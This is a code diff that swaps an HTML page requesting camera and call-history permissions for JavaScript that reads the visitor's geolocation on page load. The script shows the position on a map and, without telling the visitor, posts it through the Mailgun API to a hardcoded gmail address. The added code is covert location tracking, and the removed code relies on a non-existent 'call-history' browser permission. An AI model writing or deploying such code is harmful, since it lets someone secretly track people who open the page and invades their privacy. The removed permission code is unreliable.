@@ -1,59 +1,44 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Permission Request</title>
-</head>
-<body>
-  <h1>Permission Request</h1>
-  <p>Please grant the following permissions:</p>
-  <ul>
-    <li>Camera</li>
-    <li>Call History</li>
-  </ul>
-  <button id="grant-permissions">Grant Permissions</button>
+// Get the current location of the device
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else {
+    console.log("Geolocation is not supported by this browser.");
+  }
+}
 
-  <script>
-    document.getElementById('grant-permissions').addEventListener('click', function() {
-      // Request camera permission
-      navigator.mediaDevices.getUserMedia({ video: true })
-        .then(function(stream) {
-          console.log('Camera permission granted');
-          // Save the camera stream to a variable
-          var cameraStream = stream;
-        })
-        .catch(function(error) {
-          console.log('Camera permission denied:', error);
-        });
+// Display the location on a map
+function showPosition(position) {
+  var latitude = position.coords.latitude;
+  var longitude = position.coords.longitude;
 
-      // Request call history permission
-      navigator.permissions.query({ name: 'call-history' })
-        .then(function(permissionStatus) {
-          console.log('Call history permission status:', permissionStatus.state);
-          if (permissionStatus.state === 'granted') {
-            console.log('Call history permission granted');
-            // Access call history data
-            var callHistory = getCallHistory();
-            console.log('Call history data:', callHistory);
-          } else {
-            console.log('Call history permission denied');
-          }
-        });
-    });
+  // Send the location to your email
+  sendEmail(latitude, longitude);
 
-    function getCallHistory() {
-      // Code to retrieve call history data
-      // This is just an example and may not work on all devices
-      var callHistory = [];
-      var calls = window.callHistory || [];
-      for (var i = 0; i < calls.length; i++) {
-        callHistory.push({
-          number: calls[i].number,
-          date: calls[i].date,
-          duration: calls[i].duration
-        });
-      }
-      return callHistory;
-    }
-  </script>
-</body>
-</html>
+  // Create a map
+  var map = L.map('map').setView([latitude, longitude], 13);
+
+  // Add a tile layer
+  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+    attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
+  }).addTo(map);
+
+  // Add a marker at the current location
+  L.marker([latitude, longitude]).addTo(map);
+}
+
+// Send the location to your email
+function sendEmail(latitude, longitude) {
+  var email = 'msiyol9045@gmail.com';
+  var subject = 'Location Update';
+  var body = 'Latitude: ' + latitude + '\nLongitude: ' + longitude;
+
+  var xhr = new XMLHttpRequest();
+  xhr.open('POST', 'https://api.mailgun.net/v3/YOUR-DOMAIN/messages', true);
+  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+  xhr.setRequestHeader('Authorization', 'Basic ' + btoa('api:YOUR-API-KEY'));
+  xhr.send('from=' + encodeURIComponent(email) + '&to=' + encodeURIComponent(email) + '&subject=' + encodeURIComponent(subject) + '&text=' + encodeURIComponent(body));
+}
+
+// Get the location
+getLocation();
